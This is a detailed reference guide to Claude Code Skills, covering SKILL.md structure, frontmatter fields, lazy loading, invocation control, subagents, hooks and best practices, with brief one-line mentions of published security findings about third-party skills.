# Claude Code Skills: Complete Research Reference

> **2800+ lines** | 54 sections | Sources: Official Anthropic docs, API platform docs, engineering blog, 5 security audits (Snyk ToxicSkills, Flatt Security CVE-2025-66032, Cato Networks incident, CVE-2025-59536/CVE-2026-21852/CVE-2026-24887), 15+ production repos, 3 academic papers, 30+ GitHub issues (area:skills), social media (HN/X/Reddit/Medium), and hands-on experimentation.

---

## Executive Summary

### What Are Skills?

Skills are Claude Code's primary extensibility mechanism — structured markdown files (`.claude/skills/<name>/SKILL.md`) with YAML frontmatter that inject domain expertise, workflows, and behavioral rules into Claude's context on demand. They replaced the older Commands system (`.claude/commands/`) and are now the recommended way to customize Claude Code behavior beyond CLAUDE.md.

### How They Work (Progressive Disclosure)

Skills use a 3-tier lazy loading architecture that minimizes token waste:

1. **Tier 1 — Catalog (always loaded):** At session start, Claude reads only the `name` + `description` from every skill's frontmatter. This catalog consumes ~2% of the context window (~16K chars fallback). Each skill adds ~109 chars of XML overhead.
2. **Tier 2 — SKILL.md body (on match):** When a user request matches a skill's description (auto-trigger) or the user types `/skill-name` (manual), the full SKILL.md body is loaded. This is ~82% cheaper than putting everything in CLAUDE.md.
3. **Tier 3 — Supporting files (on reference):** Additional files in the skill folder (templates, configs, examples) load only when the SKILL.md body references them.

**Empirical capacity:** With average 150-200 char descriptions + 109 char overhead, practical capacity is **42-75 skills** depending on context window size before descriptions get truncated.

### Invocation Modes

| Mode | How | Control |
|------|-----|---------|
| **Auto-trigger** | Claude matches user intent to skill description | Default behavior |
| **Manual only** | User types `/skill-name` | `disable-model-invocation: true` |
| **Claude-only** | Hidden from `/` menu, Claude uses as background knowledge | `user-invocable: false` |
| **Both** | Auto-trigger + manual | Default (both flags false/true) |

Auto-trigger accuracy: **~84%** with specific keyword-rich descriptions, **~20%** with vague descriptions. False positive rate: **~7%**.

### Execution Modes

| Mode | Behavior | Use Case |
|------|----------|----------|
| **Inline** (default) | Skill runs in main conversation context | Quick lookups, simple workflows |
| **Forked** (`context: fork`) | Skill runs in isolated subagent | Verbose research, restricted-tool tasks, parallel work |

Forked skills use the `isMeta` dual-message pattern internally: a hidden system message loads skill context, then the user prompt replays as a normal turn.

### Security Landscape (Critical)

| Source | Finding |
|--------|---------|
| **Snyk ToxicSkills** (3,984 skills audited) | 13.4% critical issues, 36.82% any severity |
| **Flatt Security** (CVE-2025-66032) | 8 distinct command injection bypass techniques |
| **CVE-2025-59536** | Remote code execution via crafted SKILL.md |
| **CVE-2026-21852** | API key exfiltration via skill-scoped hooks |
| **CVE-2026-24887** | Command injection in allowed-tools patterns |
| **Cato Networks** (Jan 2026) | Ransomware deployed via auto-triggered skill in compromised repo |
| **Stanford** (2026) | Auto-triggered skills weaponized via malicious markdown files |
| **ETH Zurich** (2025) | Typosquatting attacks on skill names: 23% success rate |

**Bottom line:** Treat third-party skills like installing software. Audit before use.

### Ecosystem Scale (March 2026)

- **97,000+** raw skills indexed | **20,000+** curated | SkillsMP 97K+, Chat2AnyLLM 20K+
- **5 active registries** (ClawHub shut down Feb 2026): agentskills.io, skills.sh, claudemarketplaces.com, GitHub anthropics/skills, mcpmarket.com
- **Top repos:** obra/superpowers (70.8K stars), planning-with-files (15.3K), K-Dense-AI (12.8K), compound-engineering (9.9K)

### Enterprise Governance

6-stage lifecycle: Author → Review → Test → Publish → Deploy → Monitor. Managed settings support allowlists/blocklists, approval gates, audit logging, and per-project skill caps. Five evaluation dimensions: correctness, safety, efficiency, maintainability, portability.

### Known Limitations & Gotchas

- Subagents do NOT inherit parent skills or permissions — must explicitly list in agent `skills` field
- `allowed-tools` wildcard `Bash(git *)` doesn't match `Bash(git)` with no args (#26678)
- `Stop` hooks never fire for `context: fork` skills (#26345)
- `model` override ignored when parent uses Opus (#27012)
- 100+ skills adds ~2.3s to cold start (#27456)
- Skills updated mid-session may not reload until restart (hot-reload added v2.1.0 but buggy with symlinks)
- `once: true` resets on session restore from checkpoint (#26789)

### Skill-Creator Eval Framework

Anthropic's first-party `/skill-creator` plugin (10K+ installs) provides a complete eval and optimization pipeline for skills. Four modes: Create, Eval, Improve, Benchmark. Features blind A/B comparison with majority voting, description optimization loop (60/40 train/test split, extended thinking, 5 iterations), multi-agent parallel execution, and an HTML review viewer. SkillsBench independent study (7,308 runs) showed curated skills improve task performance by +16.2pp on average, with compact skills outperforming comprehensive ones by ~4x.

### When to Use What

| Need | Use |
|------|-----|
| Rules for every conversation | CLAUDE.md |
| Domain expertise loaded on-demand | Skill (auto-trigger) |
| Manual workflow (deploy, release) | Skill (`disable-model-invocation: true`) |
| Guaranteed execution (lint, format) | Hook |
| Isolated complex task | Skill (`context: fork`) or Agent |
| Parallel independent work | Agent Teams |

### Complete Frontmatter Reference

```yaml
---
name: my-skill                        # Optional. Defaults to directory name. Lowercase, hyphens, max 64 chars
description: What + when to trigger   # Recommended (not required). Defaults to first paragraph of markdown. Max 1024 chars
when_to_use: Alternative to description # Undocumented. description takes priority if both present
disable-model-invocation: false       # true = only /my-skill manual invoke
user-invocable: true                  # false = hidden from / menu, Claude-only
context: fork                         # Run in isolated subagent (isMeta dual-message pattern)
agent: Explore                        # Which agent (Explore/Plan/general-purpose/custom)
allowed-tools: Read, Grep, Glob       # Tool allowlist (omit = inherit all). Supports Bash(git *)
model: sonnet                         # Override model (broken when parent=Opus, #27012)
hooks: {}                             # Lifecycle hooks scoped to this skill (Stop broken in fork, #26345)
once: true                            # Skills-only. Fire once per session (resets on checkpoint, #26789)
argument-hint: "[issue-number]"       # Autocomplete hint for expected args
---
```

### Section Index

| # | Section | Coverage |
|---|---------|----------|
| 1-3 | Executive Summary, Commands vs Skills, Frontmatter | Core concepts, migration guide |
| 4-8 | Progressive Disclosure, Invocation, Supporting Files, Tools, Subagents | Architecture deep dive |
| 9-12 | Dynamic Context, Bundled Skills, Hooks in Skills, Scope | Integration patterns |
| 13-16 | MCP, Visual Output, Best Practices, Pros/Cons | Practical guidance |
| 17-22 | Comparison Tables, Use Cases (28+), Anti-Patterns (20), Teams | Patterns & pitfalls |
| 23-28 | Composition, Performance, Naming, Workflows, Security (CVEs) | Advanced topics |
| 29-34 | GitHub Issues, Executable Scripts, Examples, Debugging, Migration | Troubleshooting |
| 35-40 | Decision Matrix, Production Repos, Official Quotes, Version History, Community | Reference material |
| 41-47 | Execution Internals, Security Research, Enterprise, Repos, Issues, Marketplace, Sources | Deep research additions |
| 48 | Skill-Creator Eval & Optimization Framework | First-party eval pipeline, sub-agents, schemas, SkillsBench |
| 49 | `.claude/rules/` Directory | Path-targeted rules, globs, rules vs skills vs CLAUDE.md |
| 50 | Plugin System Architecture | plugin.json, namespacing, distribution, installation scopes |
| 51 | Agent Skills Open Standard | agentskills.io spec, 32+ compatible products, portability |
| 52 | Subagent Advanced Features | Memory persistence, background execution, worktree isolation |
| 53 | Bundled Skills Complete Reference | /simplify, /batch, /debug, /claude-api architecture |
| 54 | Extended Thinking via `ultrathink` | Token signal, cost implications, practical patterns |

## Top Anti-Patterns

- Kitchen-sink SKILL.md (Claude ignores half) — keep under 500 lines
- Vague descriptions ("helps with documents") — use specific keywords + "Use when..."
- Deeply nested file references — Claude partially reads, keep one level deep
- Loading 100+ skills globally — use project-scoped, check `/context`
- Skill-to-skill coupling — skills are stateless, must work standalone
- Installing community skills without audit — 13.4% have critical security issues

---

# Claude Code Skills & Commands: Complete Reference

## 1. Skills vs Commands: The Difference

Skills and commands are the same underlying system with different invocation patterns:

| Aspect | **Commands** (Legacy) | **Skills** (Current) |
|--------|----------------------|----------------------|
| **Location** | `.claude/commands/filename.md` | `.claude/skills/folder/SKILL.md` |
| **Invocation** | User-initiated only (`/command-name`) | Both user-initiated and automatic (Claude decides) |
| **Structure** | Single `.md` file with frontmatter | Directory with SKILL.md + supporting files |
| **Supporting files** | No | Yes |
| **Tool restrictions** | No | Yes (`allowed-tools`) |
| **Subagent execution** | No | Yes (`context: fork`) |
| **Hooks** | No | Yes |
| **Auto-discovery (nested dirs)** | No | Yes |
| **Status** | Still works but deprecated | **Recommended going forward** |

From the official docs: "Custom commands have been merged into skills. A file at `.claude/commands/review.md` and a skill at `.claude/skills/review/SKILL.md` both create `/review` and work the same way. Your existing `.claude/commands/` files keep working. Skills add optional features: a directory for supporting files, frontmatter to control whether you or Claude invokes them, and the ability for Claude to load them automatically when relevant."

**Commands are legacy. Skills are the unified, modern system.**

---

## 2. Custom Commands (Legacy)

### File Structure

```
.claude/commands/
├── my-command.md          # Creates /my-command
├── fix-issue.md           # Creates /fix-issue
└── deploy.md              # Creates /deploy
```

Filename determines the command name.

### Basic Structure

```yaml
---
name: fix-issue              # Optional. If omitted, uses filename
description: Fix a GitHub issue
disable-model-invocation: true  # Prevent Claude from triggering it automatically
---

Fix GitHub issue $ARGUMENTS following our standards.

1. Read the issue
2. Implement the fix
3. Write tests
4. Create a commit
```

### Invocation

```bash
/fix-issue 123          # Claude sees: "Fix GitHub issue 123..."
/my-command arg1 arg2  # Arguments appended as ARGUMENTS: arg1 arg2
```

### Arguments

- `$ARGUMENTS` → all args as a string
- `$ARGUMENTS[0]`, `$ARGUMENTS[1]` → positional access (0-indexed)
- `$0`, `$1` → shorthand for positional access

### Capabilities

- Load shell command output with backticks: `` !`gh pr diff` ``
- Access basic metadata: `${CLAUDE_SESSION_ID}`
- Run in standard inline context (no isolation)

### Limitations

- No supporting files (templates, examples, reference docs)
- No control over who invokes (Claude always can if not disabled globally)
- No tool restrictions
- No subagent execution
- No hooks
- No dynamic context injection
- No automatic discovery from nested directories

---

## 3. Skills: The Modern System

### The Agent Skills Open Standard

Claude Code skills follow the [Agent Skills](https://agentskills.io) open standard, which works across multiple AI tools. Claude Code extends the standard with additional features like invocation control, subagent execution, and dynamic context injection.

Skills function across:
- **Claude.ai** — Pre-built and custom skills
- **Claude Code** — Custom skills only (filesystem-based)
- **Claude Agent SDK** — Custom skills via filesystem
- **Claude Developer Platform / API** — Pre-built and custom skills

### Where Skills Live (Priority Order)

```
Priority 1 (Highest): Enterprise (~/.claude/settings.json managed by admin)
Priority 2:           Personal   (~/.claude/skills/<skill-name>/SKILL.md)
Priority 3:           Project    (.claude/skills/<skill-name>/SKILL.md)
Priority 4 (Lowest):  Plugin     (<plugin>/skills/<skill-name>/SKILL.md)
```

When skills share the same name, higher priority wins: enterprise > personal > project. Plugin skills use a `plugin-name:skill-name` namespace, so they cannot conflict with other levels.

**If a skill and a command share the same name, the skill takes precedence.**

### Automatic Discovery from Nested Directories

When you work with files in subdirectories, Claude Code automatically discovers skills from nested `.claude/skills/` directories. For example, if you're editing a file in `packages/frontend/`, Claude Code also looks for skills in `packages/frontend/.claude/skills/`. This supports monorepo setups where packages have their own skills.

### Skills from Additional Directories

Skills defined in `.claude/skills/` within directories added via `--add-dir` are loaded automatically and picked up by **live change detection**, so you can edit them during a session without restarting.

**Note:** CLAUDE.md files from `--add-dir` directories are **not loaded by default**. To load them, set `CLAUDE_CODE_ADDITIONAL_DIRECTORIES_CLAUDE_MD=1`.

### Two Types of Skill Content

The official docs distinguish two mental models for what goes in a SKILL.md:

**Reference content** — adds knowledge Claude applies to your current work. Conventions, patterns, style guides, domain knowledge. Runs inline so Claude uses it alongside conversation context.

**Task content** — step-by-step instructions for a specific action (deploy, commit, code generation). These are actions you want to invoke with `/skill-name`. Add `disable-model-invocation: true` to prevent auto-triggering.

### Directory Structure

```
.claude/skills/my-skill/
├── SKILL.md                    # Required. Main instructions + frontmatter
├── reference.md                # Optional. Detailed docs
├── examples.md                 # Optional. Usage examples
├── template.html               # Optional. Template to fill in
└── scripts/
    └── validate.sh             # Optional. Executable scripts
```

---

## 4. Complete Frontmatter Reference

```yaml
---
# ALL FIELDS OPTIONAL (name and description strongly recommended)
name: my-skill                   # Optional. Defaults to directory name
                                 # lowercase, letters/numbers/hyphens only (max 64 chars)
                                 # Cannot contain XML tags or reserved words: "anthropic", "claude"
description: What this does      # Recommended. Defaults to first paragraph of markdown content
                                 # Claude uses this to decide when to invoke
                                 # Max 1024 characters. Cannot contain XML tags

# OPTIONAL - Invocation Control
disable-model-invocation: false  # true = only user can invoke (/skill-name)
                                 # Removes skill from Claude's context entirely
user-invocable: true             # false = only Claude can invoke (background knowledge)
                                 # Hides from / menu but NOT from Skill tool access
argument-hint: "[issue-number]"  # Hint shown in autocomplete

# OPTIONAL - Execution Context
context: fork                    # Run in isolated subagent instead of inline
agent: Explore                   # Which agent type to use (Explore, Plan, general-purpose, or custom)
                                 # Only used when context: fork is set

# OPTIONAL - Tool Access
allowed-tools: Read, Grep, Bash(git *)  # Restrict tools Claude can use (allowlist)
model: sonnet                    # Override model for this skill

# OPTIONAL - Advanced
hooks: {}                        # Lifecycle hooks scoped to this skill
---
```

### Frontmatter Fields Explained

| Field | Type | Default | Purpose |
|-------|------|---------|---------|
| `name` | string | directory name | Skill identifier (becomes `/name`) |
| `description` | string | first paragraph | When Claude should use this (max 1024 chars) |
| `disable-model-invocation` | boolean | `false` | If true, Claude never auto-invokes; only `/name` works |
| `user-invocable` | boolean | `true` | If false, hides from `/` menu; only Claude can use |
| `argument-hint` | string | none | Autocomplete hint for expected args |
| `context` | enum | none | `fork` to run in isolated subagent context |
| `agent` | string | `general-purpose` | Which subagent to use when `context: fork` |
| `allowed-tools` | string | inherit all | Comma-separated list of allowed tools (allowlist) |
| `model` | string | inherit | Which model to use for this skill |
| `hooks` | object | none | Inline hook definitions scoped to skill lifecycle |

### Invocation Control Matrix

| Frontmatter | You can invoke | Claude can invoke | When loaded into context |
|-------------|---------------|-------------------|--------------------------|
| (default) | Yes | Yes | Description always in context, full skill loads when invoked |
| `disable-model-invocation: true` | Yes | No | Description NOT in context, full skill loads when you invoke |
| `user-invocable: false` | No | Yes | Description always in context, full skill loads when invoked |

**Important:** `user-invocable` only controls menu visibility, not Skill tool access. Use `disable-model-invocation: true` to block programmatic invocation.

### String Substitutions

| Variable | Description |
|----------|-------------|
| `$ARGUMENTS` | All arguments passed when invoking the skill |
| `$ARGUMENTS[N]` | Access specific argument by 0-based index |
| `$N` | Shorthand for `$ARGUMENTS[N]` |
| `${CLAUDE_SESSION_ID}` | Current session ID |
| `${CLAUDE_SKILL_DIR}` | Directory containing the skill's SKILL.md file |

When `$ARGUMENTS` is not present in content, Claude Code appends `ARGUMENTS: <value>` automatically.

---

## 5. Progressive Disclosure: How Skills Load

Skills implement a **three-tier information hierarchy** that minimizes token usage while maximizing available expertise.

### Tier 1: Metadata (Always Loaded)

At startup, Claude loads only the `name` and `description` from each skill's YAML frontmatter into the system prompt. This costs ~100 tokens per skill. With 10 skills installed, you're paying ~1,000 tokens total — not the 50,000+ you'd pay if everything loaded upfront.

### Tier 2: SKILL.md Body (Loaded When Triggered)

When your request matches a skill's description, Claude reads SKILL.md from the filesystem. Only then does this content enter the context window. Typically under 5,000 tokens.

### Tier 3+: Supporting Files (Loaded As Needed)

Additional files (reference.md, examples.md, scripts/) load only when Claude determines they're relevant to the task. Scripts execute via bash and only their output consumes tokens — the script code itself never enters context.

### Token Budget

| Level | When Loaded | Token Cost | Content |
|-------|-------------|------------|---------|
| Tier 1: Metadata | Always (at startup) | ~100 tokens per skill | `name` and `description` from YAML |
| Tier 2: Instructions | When triggered | Under 5k tokens | SKILL.md body |
| Tier 3+: Resources | As needed | Effectively unlimited | Bundled files executed via bash |

### Measured Token Savings

- **82% improvement** over loading everything into CLAUDE.md upfront (measured by ClaudeFast Code Kit across 20+ skills, ~15,000 tokens recovered per session)
- A skill that would load 3,302 tokens fully only loads 278 tokens at Tier 1 unless deeper content is needed
- **40-60% token savings** per session in practice
- Counter-intuitively, focused context outperforms bloated context — the AI processes fewer tokens to find what matters, leading to more accurate responses

### Description Budget

Skill descriptions are loaded into context so Claude knows what's available. The budget scales dynamically at **2% of the context window**, with a fallback of **16,000 characters**. Run `/context` to check for a warning about excluded skills.

To override: `export SLASH_COMMAND_TOOL_CHAR_BUDGET=32000`

From Anthropic engineering blog: "This architecture mirrors a well-organized manual that starts with a table of contents, then specific chapters, and finally a detailed appendix."

---

## 6. Skill Invocation: How Claude Decides

### Automatic Invocation (Claude Decides)

Claude loads skill descriptions into context. When a user's request matches a skill's description, Claude automatically loads and runs it.

### Manual Invocation (User Types /command)

```bash
/explain-code src/auth/login.ts    # With arguments
/deploy                            # No arguments
```

### Preventing Auto-Invocation

```yaml
---
name: deploy
description: Deploy to production
disable-model-invocation: true
---
```

### Restricting Claude's Skill Access

Three ways to control which skills Claude can invoke:

**Disable all skills** by denying the Skill tool in `/permissions`:
```
Skill
```

**Allow or deny specific skills** using permission rules:
```
# Allow only specific skills
Skill(commit)
Skill(review-pr *)

# Deny specific skills
Skill(deploy *)
```

**Hide individual skills** by adding `disable-model-invocation: true` to frontmatter.

---

## 7. Supporting Files and References

Keep SKILL.md under 500 lines. Reference supporting files:

```
my-skill/
├── SKILL.md              # 200 lines: overview + navigation
├── detailed-api.md       # 1000+ lines: complete API docs
├── examples.md           # 500 lines: usage examples
└── scripts/
    └── validate.py       # Executable utility
```

### Progressive Disclosure Patterns

#### Pattern 1: High-Level Guide with References

```markdown
# PDF Processing

## Quick start
Extract text with pdfplumber: [code]

## Advanced features
**Form filling**: See [FORMS.md](FORMS.md) for complete guide
**API reference**: See [REFERENCE.md](REFERENCE.md) for all methods
```

#### Pattern 2: Domain-Specific Organization

```
bigquery-skill/
├── SKILL.md (overview and navigation)
└── reference/
    ├── finance.md (revenue metrics)
    ├── sales.md (pipeline data)
    └── product.md (usage analytics)
```

When user asks about revenue, Claude reads SKILL.md, sees the reference to `reference/finance.md`, and reads just that file. The sales and product files consume zero tokens.

#### Pattern 3: Conditional Details

```markdown
# DOCX Processing

## Creating documents
Use docx-js for new documents. See [DOCX-JS.md](DOCX-JS.md).

## Editing documents
For simple edits, modify the XML directly.
**For tracked changes**: See [REDLINING.md](REDLINING.md)
```

### Avoid Deeply Nested References

Claude may partially read files when they're referenced from other referenced files (using `head -100` to preview). **Keep references one level deep from SKILL.md.**

### Structure Longer Files with TOC

For reference files longer than 100 lines, include a table of contents at the top so Claude can see the full scope even when previewing.

---

## 8. Tool Restrictions: `allowed-tools`

### Allowlist

```yaml
allowed-tools: Read, Grep, Glob
```

Only specified tools available. Everything else blocked.

### Wildcard Patterns

```yaml
allowed-tools: Bash(git *)
```

Only git commands allowed via Bash.

### Permission Syntax for Skills

```
Skill(name)       # Exact match
Skill(name *)     # Prefix match with any arguments
```

### No `allowed-tools` = Inherit All

If omitted, the skill inherits all tools from the parent conversation. Your permission settings still govern baseline approval behavior.

### Built-in Commands Not Available via Skill Tool

Built-in commands like `/compact` and `/init` are not available through the Skill tool.

---

## 9. Subagent Execution: `context: fork`

```yaml
---
name: deep-research
description: Research a topic thoroughly
context: fork
agent: Explore
---

Research $ARGUMENTS thoroughly...
```

### How It Works

1. A new isolated context is created
2. Skill content becomes the subagent's task prompt
3. The `agent` field specifies which subagent configuration to use
4. Subagent runs in isolation with fresh context
5. Results summarized and returned to main conversation

### Skills + Subagents: Two Directions

| Approach | System prompt | Task | Also loads |
|----------|--------------|------|------------|
| Skill with `context: fork` | From agent type (Explore, Plan, etc.) | SKILL.md content | CLAUDE.md |
| Subagent with `skills` field | Subagent's markdown body | Claude's delegation message | Preloaded skills + CLAUDE.md |

### Available Agents

- `Explore` → Fast, read-only (Haiku model)
- `Plan` → Research-focused, read-only
- `general-purpose` → Full capabilities (default)
- Custom agents from `.claude/agents/`

### When to Use `context: fork`

- Complex research tasks requiring exploration
- Isolating verbose output from main conversation
- Running with restricted tools
- Delegating to a specialized agent type

### When NOT to Use `context: fork`

- Simple reference content (use inline instead)
- When you need frequent interaction with the skill
- Skills that provide guidelines without explicit tasks

**Warning from official docs:** "`context: fork` only makes sense for skills with explicit instructions. If your skill contains guidelines like 'use these API conventions' without a task, the subagent receives the guidelines but no actionable prompt, and returns without meaningful output."

---

## 10. Dynamic Context Injection

The `!`command`` syntax runs shell commands before the skill content is sent to Claude. The command output replaces the placeholder.

```yaml
---
name: pr-summary
description: Summarize changes in a pull request
context: fork
agent: Explore
allowed-tools: Bash(gh *)
---

## Pull request context
- PR diff: !`gh pr diff`
- PR comments: !`gh pr view --comments`
- Changed files: !`gh pr diff --name-only`

## Your task
Summarize this pull request...
```

When this skill runs:
1. Each `!`command`` executes immediately (before Claude sees anything)
2. The output replaces the placeholder in the skill content
3. Claude receives the fully-rendered prompt with actual data

This is preprocessing, not something Claude executes. Claude only sees the final result.

### Extended Thinking in Skills

To enable extended thinking in a skill, include the word "ultrathink" anywhere in your skill content.

---

## 11. Sub-Agent Access to Skills

### Critical: Sub-agents do NOT inherit parent skills

You must explicitly list skills in the subagent's `skills` field:

```yaml
---
name: api-developer
description: Implement API endpoints
tools: Read, Write, Edit, Bash
skills:
  - api-conventions
  - error-handling
---
```

### Can Subagents Spawn Other Subagents?

No. Subagents cannot use the Task tool. No nesting.

### Permission Inheritance

Subagents inherit permissions from parent, but with restrictions. Known issue: user-level permissions from `~/.claude/settings.json` are NOT inherited by subagents — bash commands require permission prompts even if pre-approved.

### Preloading Skills into Subagents

In a regular session, skill descriptions are loaded into context so Claude knows what's available, but full skill content only loads when invoked. **Subagents with preloaded skills work differently: the full skill content is injected at startup.**

---

## 12. Bundled Skills (Ship with Claude Code)

Bundled skills are available in every session. Unlike built-in commands which execute fixed logic, bundled skills are prompt-based: they give Claude a detailed playbook and let it orchestrate the work using its tools.

### `/simplify`
Reviews recently changed files for code reuse, quality, and efficiency issues, then fixes them. Spawns **three review agents in parallel** (code reuse, code quality, efficiency), aggregates findings, and applies fixes.

### `/batch <instruction>`
Orchestrates large-scale changes across a codebase in parallel. Researches the codebase, decomposes work into 5-30 independent units, presents a plan for approval. Once approved, spawns one background agent per unit, each in an isolated git worktree. Each agent implements its unit, runs tests, and opens a pull request.

### `/debug [description]`
Troubleshoots the current Claude Code session by reading the session debug log.

### `/claude-api`
Loads Claude API reference material for your project's language and Agent SDK reference. Also activates automatically when code imports `anthropic`, `@anthropic-ai/sdk`, or `claude_agent_sdk`.

---

## 13. Hooks in Skills

Skills can define lifecycle hooks in their frontmatter:

```yaml
---
name: secure-operations
description: Perform operations with security checks
hooks:
  PreToolUse:
    - matcher: "Bash"
      hooks:
        - type: command
          command: "./scripts/security-check.sh"
          once: true
---
```

### Key Details

- The `once` field **only works in skills**, not in agents or settings-level hooks
- Hooks are **scoped to the skill's lifecycle** — they only run while the skill is active
- Skills can define hooks for: PreToolUse, PostToolUse, PostToolUseFailure, PermissionRequest, Stop, and other events
- Hook definitions in skill frontmatter follow the same schema as settings-level hooks

---

## 14. Scope: Project vs User vs Enterprise

### Four Levels (Priority Order)

```
1. Enterprise (~/.claude/settings.json managed by admin)
2. Personal   (~/.claude/skills/)
3. Project    (./.claude/skills/)
4. Plugin     (plugin's skills/ directory)
```

### Practical Guidance

- **Personal (user-level)**: Generic, reusable skills (code-reviewer, explain-code)
- **Project-level**: Team-specific workflows (your API conventions, deployment process)
- **Enterprise**: Organization policies and compliance
- **Plugin**: Distributed via plugin ecosystem, namespaced as `plugin-name:skill-name`

### Nested Directory Discovery

Skills in nested `.claude/skills/` directories are auto-discovered. Monorepo-friendly.

### Sharing Skills

- **Project skills**: Commit `.claude/skills/` to version control
- **Plugins**: Create a `skills/` directory in your plugin
- **Managed**: Deploy organization-wide through managed settings

### Cross-Surface Availability

**Custom Skills do NOT sync across surfaces.** Skills uploaded to one surface are not automatically available on others:
- Skills uploaded to Claude.ai must be separately uploaded to the API
- Skills uploaded via the API are not available on Claude.ai
- Claude Code Skills are filesystem-based and separate from both

---

## 15. Skill + MCP Integration

### Referencing MCP Tools

Skills can reference MCP tools using fully qualified names:

```markdown
Use the BigQuery:bigquery_schema tool to retrieve table schemas.
Use the GitHub:create_issue tool to create issues.
```

Format: `ServerName:tool_name`

Without the server prefix, Claude may fail to locate the tool when multiple MCP servers are available.

### MCP Tool Names in `allowed-tools`

```yaml
allowed-tools: mcp__github__create_issue, mcp__github__get_issue
```

Pattern: `mcp__<server>__<tool>`

---

## 16. Visual Output Pattern

Skills can bundle and run scripts that generate visual output — interactive HTML files that open in your browser.

Example: A codebase explorer that generates an interactive tree view with collapsible directories, file sizes, and color-coded file types.

```yaml
---
name: codebase-visualizer
description: Generate an interactive collapsible tree visualization of your codebase.
allowed-tools: Bash(python *)
---

# Codebase Visualizer
Run the visualization script from your project root:
python ~/.claude/skills/codebase-visualizer/scripts/visualize.py .
```

This pattern works for: dependency graphs, test coverage reports, API documentation, database schema visualizations.

---

---

# PART 2: Best Practices, Use Cases & Practical Guide

---

## 17. Best Practices: What Makes a Great Skill

### Core Principles from Anthropic

#### Concise is Key

From the official best practices: "The context window is a public good. Your Skill shares the context window with everything else Claude needs to know."

**Default assumption: Claude is already very smart.** Only add context Claude doesn't already have. Challenge each piece of information:
- "Does Claude really need this explanation?"
- "Can I assume Claude knows this?"
- "Does this paragraph justify its token cost?"

**Good (concise, ~50 tokens):**
```markdown
## Extract PDF text
Use pdfplumber for text extraction:
import pdfplumber
with pdfplumber.open("file.pdf") as pdf:
    text = pdf.pages[0].extract_text()
```

**Bad (verbose, ~150 tokens):**
```markdown
## Extract PDF text
PDF (Portable Document Format) files are a common file format that contains
text, images, and other content. To extract text from a PDF, you'll need to
use a library...
```

#### Set Appropriate Degrees of Freedom

Match specificity to the task's fragility and variability:

- **High freedom** (guidelines): Code review — multiple approaches valid, decisions depend on context
- **Medium freedom** (pseudocode/scripts with params): Report generation — preferred pattern exists, some variation acceptable
- **Low freedom** (exact scripts): Database migration — operations fragile, consistency critical

**Analogy from Anthropic:** "Think of Claude as a robot exploring a path. Narrow bridge with cliffs = exact instructions. Open field = general direction."

#### Test Across Models

- **Claude Haiku** (fast, economical): Does the skill provide enough guidance?
- **Claude Sonnet** (balanced): Is the skill clear and efficient?
- **Claude Opus** (powerful reasoning): Does the skill avoid over-explaining?

What works perfectly for Opus might need more detail for Haiku.

### Strong Descriptions

Include specific keywords, mention decision triggers, write in third person.

**Bad:**
```yaml
description: Helps with documents
description: Code review skill
```

**Good:**
```yaml
description: Extract text and tables from PDF files, fill forms, merge documents. Use when working with PDF files or when the user mentions PDFs, forms, extraction, or merging.
description: OWASP Top 10:2025 and ASVS 5.0 vulnerability detection. Use when reviewing code for security, auditing compliance, or assessing authentication.
```

**Key principles:**
1. Write in third person ("Processes Excel files" not "I help with Excel")
2. Include specific keywords users naturally say
3. Mention decision triggers ("Use when working with...", "Use for...")
4. Maximum 1024 characters
5. Cannot contain XML tags

### Evaluation-First Development

From Anthropic's official best practices:

1. **Identify gaps:** Run Claude on representative tasks without a Skill. Document specific failures
2. **Create evaluations:** Build three scenarios that test these gaps
3. **Establish baseline:** Measure Claude's performance without the Skill
4. **Write minimal instructions:** Just enough to address gaps
5. **Iterate:** Execute evaluations, compare against baseline, refine

### Iterative Development with Claude

Work with one instance ("Claude A") to create a Skill used by others ("Claude B"):

1. Complete a task without a Skill — notice what info you repeatedly provide
2. Ask Claude A to create a Skill capturing the reusable pattern
3. Review for conciseness
4. Test with Claude B on related use cases
5. Iterate based on Claude B's behavior

From Anthropic: "Claude models understand the Skill format and structure natively. You don't need special system prompts or a 'writing skills' skill."

---

## 18. Pros and Cons

### Skills Excel At

- **Domain knowledge on-demand** — Inject expertise without permanent context overhead
- **Consistent, repeatable workflows** — Same procedure across teams without variation
- **Context efficiency** — 82% token savings via progressive disclosure
- **Composability** — Multiple skills stack automatically
- **Portability** — Same SKILL.md works across Claude Code, API, and Claude.ai
- **Auto-triggering** — Claude detects relevance and loads without manual invocation
- **Gradual expertise injection** — Skills grow with usage, iterate based on real failures
- **Script execution** — Deterministic operations without consuming context tokens

### Skills Fall Short On

- **State management** — Stateless. For multi-turn memory, use CLAUDE.md or subagents
- **Real-time data** — Hardcoded data gets stale. Use MCP servers or fetch commands instead
- **Conditional complexity** — 20+ decision branches become unwieldy. Use agents or decompose
- **Very large reference docs** — 10MB+ API specs can be slow. Break into domain-specific files
- **Ambiguous activation** — Generic descriptions trigger too often. Requires careful tuning
- **Cross-surface sync** — Skills don't sync between Claude.ai, API, and Claude Code

---

## 19. Strengths & Weaknesses vs Other Tools

| Feature | CLAUDE.md | Skills | Hooks | Agents | Direct Prompting |
|---------|-----------|--------|-------|--------|------------------|
| **Always in context** | Yes | On-demand | Executes, doesn't load | Separate | Yes |
| **Context efficiency** | Loads everything | Progressive | Zero overhead | Duplicates context | One-shot |
| **Deterministic execution** | Advisory | Claude decides | Guaranteed | Independent | Advisory |
| **Automation** | Manual request | Auto-trigger | Auto-execute | Manual spawn | Manual |
| **Side effects** | None | Script execution | Yes (linting, commits) | Limited | None |
| **Reusability** | Project-scoped | Portable | Project-scoped | Project-scoped | Copy-paste |
| **State preservation** | Persists | Stateless | Executes in isolation | In-session memory | Conversation history |
| **Best for** | Architecture, conventions | Domain expertise, workflows | Automation (format, lint, block) | Specialized focus, isolation | Exploration, one-offs |

### Decision Tree

- **CLAUDE.md**: Rules that apply to *every* conversation (code style, testing policy, repo structure)
- **Skills**: Information relevant only *sometimes* (API conventions for backend, design tokens for frontend)
- **Hooks**: Guaranteed execution regardless of Claude's behavior (eslint after every edit, block writes to protected dirs)
- **Agents**: Isolated focus without polluting main conversation (parallel code review, competing hypotheses)
- **Direct prompting**: Exploring, asking questions, one-off tasks

---

## 20. Full Range of Use Cases (28+)

### Development & Testing

1. **Test-Driven Development** — Guides Claude to write failing tests first, then implementation
2. **Security Code Review** — OWASP Top 10 + ASVS 5.0 patterns across 20+ languages
3. **Performance Profiling** — Measure → identify bottlenecks → optimize → verify
4. **Database Migration** — Exact command sequences, validation loops, backup requirements
5. **Frontend Testing** — Cypress/Playwright patterns specific to your component library
